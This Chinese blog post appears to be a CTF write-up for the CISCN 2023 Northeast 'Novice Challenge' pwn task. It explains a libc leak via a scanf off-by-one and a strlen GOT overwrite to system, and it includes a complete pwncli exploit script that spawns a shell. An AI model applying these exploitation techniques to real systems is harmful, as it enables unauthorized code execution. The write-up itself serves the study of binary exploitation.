---
title: CISCN 2023 东北赛区 pwn
date: 2023-07-26 19:50:34
urlname: ciscn2023pwn
tags: [pwn]
---
（缓慢更新中1/4）
## Novice Challenge
一句话版本：改strlen的got表

首先从sub_96B中泄漏libc地址：
```c
int sub_96B()
{
  int v1; // [rsp+Ch] [rbp-264h] BYREF
  __int64 v2[44]; // [rsp+10h] [rbp-260h] BYREF
  char v3[252]; // [rsp+170h] [rbp-100h] BYREF
  int v4; // [rsp+26Ch] [rbp-4h]

  v4 = 4;
  puts("Welcome to this challenge!");
  v2[0] = (__int64)&puts;
  __isoc99_scanf("%252s", v3);
  puts("Good luck!");
  __isoc99_scanf("%d", &v1);
  if ( v1 > 15 && v1 <= 21 )
    v4 = v1;
  else
    puts("No!");
  puts("gift:");
  return puts((const char *)&v2[v4]);
}
```
目标是得到v2[0]中的puts的地址。
由于scanf %s会在字符串后面补0，且长度限制是不算这个0的。所以只要输入252个字符就会把v4覆盖成0，然后再输入一个不会进if的数就行了。

接下来看
```c
int sub_A31()
{
  size_t v0; // rax

  puts("index>>");
  __isoc99_scanf("%d", &dword_2020BC);
  if ( (unsigned int)dword_2020BC >= 0x20 )
  {
    puts("No!");
    exit(1);
  }
  puts("input>>");
  read(0, byte_2020A0, 0x20uLL);
  v0 = strlen(byte_2020A0);
  printf("data length is %d\n", v0);
  puts("bye~");
  read(0, &byte_2020A0[dword_2020BC], 4uLL);
  return close(1);
}
```
2020a0+0x20>2020bc，所以可以将这个下标覆盖掉，写到别的地方去。
strlen的got在2020a0-136的位置。负数取补码。

Exp:
```python
#!/usr/bin/env python3

from pwncli import *

cli_script()

libc: ELF = gift.libc
filename = gift.filename  # current filename
is_debug = gift.debug  # is debug or not
is_remote = gift.remote  # is remote or not
gdb_pid = gift.gdb_pid  # gdb pid if debug


if gift.remote:
    libc = ELF("./libc.so.6")
    gift[libc] = libc

sla("challenge!", "a" * 252)

sla("luck!", "0")

lb = recv_current_libc_addr(0x80970, 0x1000)

libc.address = lb

leak_ex2(lb)

sla("index>>\n", "0")

sa("input>>", flat({0: "/bin/sh;", 0x1C: p32(0xFFFFFF78)}))
print(hex(libc.sym.system))
sa("bye", flat(libc.sym.system)[:-4])

rl()
ia()
```

附注：
1、sub_96b的那个数组中后续的位置会出现一个ld.so中的函数地址（仅在使用靶机版本的libc时出现），利用见：<https://www.cnblogs.com/7resp4ss/p/17530599.html>

2、使用patchelf修改程序的libc和`ld.so` (interpreter)。只改libc可能会炸掉。
```
patchelf --set-interpreter /home/w1nd/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so /home/w1nd/Desktop/pwn
patchelf --replace-needed libc.so.6 /home/w1nd/Desktop/buu/libc-2.23-x64.so pwn
```
见：<https://www.cnblogs.com/xshhc/p/16777707.html>
3、Linux ELF与动态链接库 <https://juejin.cn/post/6939332933677219848>